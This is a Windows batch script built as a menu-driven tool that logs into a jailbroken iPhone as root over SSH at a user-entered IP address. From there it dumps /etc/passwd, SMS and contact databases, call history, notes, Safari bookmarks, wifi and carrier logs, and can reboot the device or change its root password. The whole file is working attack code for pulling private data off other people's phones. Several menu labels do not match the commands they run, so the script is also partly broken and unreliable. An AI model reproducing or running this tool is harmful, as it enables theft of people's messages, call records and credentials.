@echo off
set /P ip=enter ip-
cls
echo 1. etc password dump
echo 2. list installed apps
echo 3. phone build and version
echo 4. dump wifi logs
echo 5. dump carrier logs
echo 6. dump data usage
echo 7. dump sms
echo 8. dump saved numbers
echo 9. dump alert history
echo 10. get call logs
echo 11. get bookmarks
echo 12. restart springboard
echo 13. boot into safemode
echo 14. restart
echo 15. get saved notes
echo 16. change root password
echo 17. get mac address
echo 18. screen blackout
echo 19. kill app

set /p a=
IF %a%==1 ssh root@%ip% "cd / && cat etc/passwd"
IF %a%==2 ssh root@%ip% "cd / && cd Applications && ls"
IF %a%==3 ssh root@%ip% "cd / && cd /System/Library/Accounts/AppleIDLoginPlugins/iCloudAppleIDLoginPlugin.bundle && cat Info.plist" & pause
IF %a%==4 ssh root@%ip% "cd / && cd /var/wireless/awdd/applogs/wifi && ls" & pause
IF %a%==5 ssh root@%ip% "cd / && cd /var/wireless/awdd/staging && ls" & pause
IF %a%==6 ssh root@%ip% "cd / && cd /var/wireless/Library/Databases && cat CellularUsage.db"
IF %a%==7 ssh root@%ip% "cd / && cd /var/mobile/Library/SMS && cat sms.db" & pause
IF %a%==8 ssh root@%ip% "cd / && cd /var/mobile/Library/SMS && cat chatRenderMetaData.db" & pause
IF %a%==9 ssh root@%ip% "cd / && cd /var/mobile/Library/SMS/EmergencyAlerts && cat PriorAlerts.plist" & pause
IF %a%==10 ssh root@%ip% "cd / && cd /var/mobile/Library/CallHistoryDB && cat CallHistory.storedata" & pause
IF %a%==11 ssh root@%ip% "cd / && cd /var/mobile/Library/Safari && cat Bookmarks.db" & pause
IF %a%==12 ssh root@%ip% "killall SpringBoard" & pause
IF %a%==13 ssh root@%ip% "touch /var/mobile/Library/Preferences/com.saurik.mobilesubstrate.dat; killall SpringBoard" & pause
IF %a%==14 ssh root@%ip% "kill 1" & pause
IF %a%==15 ssh root@%ip% "cd / && cd /var/mobile/Library/Notes/ && cat notes.sqlite" & pause
IF %a%==16 ssh root@%ip% "./passwd" & pause
IF %a%==17 ssh root@%ip% "bluetoothd" & pause
IF %a%==18 ssh root@%ip% "cd / && cd /Applications/Cydia.app && ./Cydia" & pause
IF %a%==19 ssh root@%ip% "ps aux" & pause